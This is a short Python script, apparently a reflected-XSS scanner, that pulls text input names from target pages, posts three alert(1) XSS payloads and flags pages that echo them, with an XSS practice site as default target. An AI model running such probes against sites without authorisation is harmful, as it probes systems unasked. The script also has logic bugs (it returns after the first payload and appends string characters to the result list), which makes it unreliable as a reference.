#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-

import requests
import re


class Xss:
    def __init__(self, targets):
        self.targets = targets
        self.target = ''
        self.payload = ['"/><img src=# onerror=alert(1);>',
                        "><body onload=alert(1)>",
                        "/></script><ScRiPt>alert(1);<ScRiPt><!--"]

    def _scan(self):
        try:
            r = requests.get(self.target, timeout=2)
            # print('get')
        except requests.exceptions.ConnectionError:
            return False
        except requests.exceptions.TooManyRedirects:
            return False
        except requests.exceptions.ReadTimeout:
            return False
        pattern = re.compile('<input.*?type="text".*?name=[\'|\"](.*?)[\'|\"].*?')
        names = re.findall(pattern, r.text)
        for name in names:
            for payload in self.payload:
                try:
                    r = requests.post(self.target, data={name: payload}, timeout=2)
                    if payload in r.text:
                        return self.target
                except ConnectionResetError:
                    print('连接中断')
                    break
                except Exception as e:
                    print(e)
                    continue
                return False

    def run(self):
        print("\n# 检测XSS:")
        results = []
        # self.get_xss()
        for target in self.targets:
            self.target = target
            result = self._scan()
            if result:
                print('可能存在漏洞; ' + result)
                results += result
        return results


def main():
    target = ['http://xss-quiz.int21h.jp/']
    s = Xss(target)
    s.run()

if __name__ == '__main__':
    main()
